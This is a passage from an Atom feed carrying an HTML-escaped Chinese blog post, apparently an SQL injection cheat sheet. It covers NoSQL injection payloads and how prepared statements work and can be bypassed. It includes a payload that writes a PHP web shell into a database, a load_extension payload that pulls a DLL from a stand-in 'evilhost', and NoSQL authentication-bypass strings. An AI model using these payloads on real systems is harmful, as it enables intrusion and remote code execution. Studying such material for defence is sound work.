keyword&#34;&gt;INSERT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;INTO&lt;/span&gt; lol&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;pwn &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;dataz&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;VALUES&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&amp;lt;?system($_GET[&#39;&lt;/span&gt;cmd&lt;span class=&#34;token string&#34;&gt;&#39;]); ?&gt;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;--&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;Load_extension&lt;/p&gt;
+&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;UNION&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;load_extension&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;\\evilhost\evil.dll&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;E&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;--&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;nosql-payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nosql-payload&#34;&gt;#&lt;/a&gt; NoSQL Payload&lt;/h2&gt;
+&lt;h3 id=&#34;常见payload-4&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见payload-4&#34;&gt;#&lt;/a&gt; 常见 Payload&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;绕过限制条件
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;&amp;#123;&amp;quot;username&amp;quot;: &amp;quot;user&amp;quot;&amp;#125;&lt;/code&gt;  =&amp;gt;  &lt;code&gt;&amp;#123;&amp;quot;username&amp;quot;: &amp;#123;&amp;quot;ne&amp;quot;: &amp;quot;fakeuser&amp;quot;&amp;#125;&amp;#125;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&amp;#123;&amp;quot;$where&amp;quot;: &amp;quot;return true&amp;quot;&amp;#125;&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;测试用字符
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;&#39;&amp;quot;\/$[].&amp;gt;&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;布尔测试常用
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;&amp;#123;&amp;quot;$ne&amp;quot;: -1&amp;#125;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&amp;#123;&amp;quot;$in&amp;quot;: []&amp;#125;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&amp;#123;&amp;quot;$where&amp;quot;: &amp;quot;return true&amp;quot;&amp;#125;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&amp;#123;&amp;quot;$or&amp;quot;: [&amp;#123;&amp;#125;,&amp;#123;&amp;quot;foo&amp;quot;:&amp;quot;1&amp;quot;&amp;#125;]&amp;#125;&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;时间
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;&amp;#123;&amp;quot;$where&amp;quot;: &amp;quot;sleep(100)&amp;quot;&amp;#125;&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;预编译&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#预编译&#34;&gt;#&lt;/a&gt; 预编译&lt;/h1&gt;
+&lt;h2 id=&#34;简介-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介-2&#34;&gt;#&lt;/a&gt; 简介&lt;/h2&gt;
+&lt;p&gt;SQL 注入是因为解释器将传入的数据当成命令执行而导致的，预编译是用于解决这个问题的一种方法。和普通的执行流程不同，预编译将一次查询通过两次交互完成，第一次交互发送查询语句的模板，由后端的 SQL 引擎进行解析为 AST 或 Opcode，第二次交互发送数据，代入 AST 或 Opcode 中执行。因为此时语法解析已经完成，所以不会再出现混淆数据和代码的过程。&lt;/p&gt;
+&lt;h2 id=&#34;模拟预编译&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#模拟预编译&#34;&gt;#&lt;/a&gt; 模拟预编译&lt;/h2&gt;
+&lt;p&gt;为了防止低版本数据库不支持预编译的情况，模拟预编译会在客户端内部模拟参数绑定的过程，进行自定义的转义。&lt;/p&gt;
+&lt;h2 id=&#34;绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绕过&#34;&gt;#&lt;/a&gt; 绕过&lt;/h2&gt;
+&lt;h3 id=&#34;预编译使用错误&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#预编译使用错误&#34;&gt;#&lt;/a&gt; 预编译使用错误&lt;/h3&gt;
+&lt;p&gt;预编译只是使用占位符替代的字段值的部分，如果第一次交互传入的命令使用了字符串拼接，使得命令是攻击者可控的，那么预编译不会生效。&lt;/p&gt;
+&lt;h3 id=&#34;部分参数不可预编译&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#部分参数不可预编译&#34;&gt;#&lt;/a&gt; 部分参数不可预编译&lt;/h3&gt;
+&lt;p&gt;在有的情况下，数据库处理引擎会检查数据表和数据列是否存在，因此数据表名和列名不能被占位符所替代。这种情况下如果表名和列名可控，则可能引入漏洞。&lt;/p&gt;
+&lt;h3 id=&#34;预编译实现错误&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#预编译实现错误&#34;&gt;#&lt;/a&gt; 预编译实现错误&lt;/h3&gt;
+&lt;p&gt;部分语言引擎在实现上存在一定问题，可能会存在绕过漏洞。&lt;/p&gt;
+&lt;h1 id=&#34;参考文章&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考文章&#34;&gt;#&lt;/a&gt; 参考文章&lt;/h1&gt;
+&lt;h2 id=&#34;tricks&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#tricks&#34;&gt;#&lt;/a&gt; Tricks&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2Jsb2cud2lsczBuLmNuL2FyY2hpdmVzLzE3OC8=&#34;&gt;sqlmap time based inject 分析&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL05ldFNQSS9TUUxJbmplY3Rpb25XaWtp&#34;&gt;SQLInjectionWiki&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvQnVjQ055Q215QVRkUkVOWnAwQUYyQQ==&#34;&gt;常见数据库写入 Webshell 汇总&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvdUVOdnBQYW43YVZkN01iU29BVDlEZw==&#34;&gt;MSSQL 数据库攻击实战指北&lt;/span&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;bypass&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#bypass&#34;&gt;#&lt;/a&gt; Bypass&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvZlNCWlBrTzAtSE5ZZkxnbVlXSktDZw==&#34;&gt;SQL 注入 ByPass 的一些小技巧&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMzY4&#34;&gt;Waf Bypass 之道&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2FsZWVuenovTVlTUUxfU1FMX0JZUEFTU19XSUtJ&#34;&gt;MySQL Bypass Wiki&lt;/span&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;nosql&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nosql&#34;&gt;#&lt;/a&gt; NoSQL&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy55dW53ZWlwYWkuY29tL2FyY2hpdmVzLzE0MDg0Lmh0bWw=&#34;&gt;NoSQL 注入的分析和缓解&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvdEc4NzRMTlRJZGlON01QdE8taG92QQ==&#34;&gt;NoSQL 注入&lt;/span&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;cheatsheet-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cheatsheet-2&#34;&gt;#&lt;/a&gt; Cheatsheet&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0lnbml0ZXRlY2hub2xvZ2llcy9NU1NRTC1QZW50ZXN0LUNoZWF0c2hlZXQ=&#34;&gt;MSSQL Pentest Cheatsheet&lt;/span&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+        <category term="网络安全" />
+        <category term="漏洞" />
+        <category term="SQL注入" />
+        <updated>2022-11-26T03:05:09.000Z</updated>
+    </entry>
+</feed>
